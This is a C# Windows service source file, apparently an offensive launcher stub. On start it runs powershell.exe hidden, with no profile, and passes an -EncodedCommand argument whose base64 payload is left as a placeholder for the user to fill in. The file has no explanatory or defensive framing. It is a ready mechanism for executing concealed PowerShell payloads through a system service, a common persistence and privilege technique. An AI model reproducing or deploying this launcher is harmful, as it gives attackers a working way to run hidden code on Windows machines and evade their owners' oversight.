using System.Diagnostics;
using System.ServiceProcess;
using System.Threading;

namespace WindowsService3
{
    public partial class Service1 : ServiceBase
    {
        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            var si = new ProcessStartInfo
            {
                FileName = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                Arguments = @"-Sta -Nop -Window Hidden -EncodedCommand <INPUT BASE64 HERE>"
            };

            var proc = new Process
            {
                StartInfo = si
            };

            var t = new Thread(() =>
            {
                proc.Start();
                proc.WaitForExit();
                proc.Dispose();
            });

            t.Start();
        }

        protected override void OnStop()
        {
        }
    }
}
